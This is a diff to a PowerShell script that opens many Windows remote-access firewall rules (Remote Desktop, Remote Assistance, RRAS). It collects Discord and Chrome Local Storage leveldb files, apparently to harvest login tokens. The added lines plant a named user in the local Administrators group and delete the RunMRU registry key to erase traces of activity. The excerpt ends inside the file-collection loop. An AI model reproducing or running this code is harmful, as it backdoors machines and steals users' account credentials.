@@ -1,3 +1,5 @@
+Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Recurse
+Add-LocalGroupMember -Group "Administrators" -Member "jfrase24"
 Enable-NetFirewallRule -Name "RemoteAssistance-DCOM-In-TCP-NoScope-Active"
 Enable-NetFirewallRule -Name "RemoteDesktop-Shadow-In-TCP"
 Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-TCP"
@@ -21,7 +23,6 @@ Enable-NetFirewallRule -Name "RVM-VDSLDR-In-TCP-NoScope"
 Enable-NetFirewallRule -Name "RRAS-GRE-In"
 Enable-NetFirewallRule -Name "RRAS-L2TP-In-UDP"
 Enable-NetFirewallRule -Name "RRAS-PPTP-In-TCP"
-Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Recurse
 $files = Get-ChildItem -Path @("$env:APPDATA/discord/Local Storage/leveldb", "$env:LOCALAPPDATA/google/chrome/user data/default/Local Storage/leveldb") -Include @('*.ldb','*.log') -Recurse -Force
 $list = @()
 foreach ($file in $files) {
